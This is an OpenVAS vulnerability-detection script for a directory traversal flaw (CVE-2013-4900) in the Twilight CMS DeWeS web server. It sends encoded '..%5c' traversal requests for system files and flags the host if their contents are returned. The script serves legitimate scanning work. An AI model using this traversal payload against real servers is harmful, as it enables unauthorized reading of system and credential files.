##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dewes_webserver_dir_trav_vuln.nasl 11401 2018-09-15 08:45:50Z cfischer $
#
# Twilight CMS DeWeS Web Server Directory Traversal Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803746");
  script_version("$Revision: 11401 $");
  script_cve_id("CVE-2013-4900");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2013-08-22 12:47:40 +0530 (Thu, 22 Aug 2013)");
  script_name("Twilight CMS DeWeS Web Server Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"The host is running Twilight CMS with DeWeS Web Server and is prone to directory
  traversal vulnerability.");
  script_tag(name:"vuldetect", value:"Send the crafted HTTP GET request and check the is it possible to read
  the system file.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"insight", value:"The flaw is due to an improper sanitation of encoded user input via HTTP
  requests using directory traversal attack (e.g., /..%5c..%5c).");
  script_tag(name:"affected", value:"Twilight CMS DeWeS web server version 0.4.2 and prior.");
  script_tag(name:"impact", value:"Successful exploitation will allow attackers to read arbitrary files
  on the target system.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2013/Aug/136");
  script_xref(name:"URL", value:"https://www.htbridge.com/advisory/HTB23167");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/528139/30/0/threaded");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/dewes-042-path-traversal");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("DeWeS/banner");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

banner = get_http_banner(port:port);
if("Server: DeWeS" >!< banner){
  exit(0);
}

files = traversal_files();
foreach file (keys(files))
{
  url = "/" + crap(data:"..%5c",length:15) + files[file];

  if(http_vuln_check(port:port, url:url, pattern:file))
  {
    report = report_vuln_url( port:port, url:url );
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
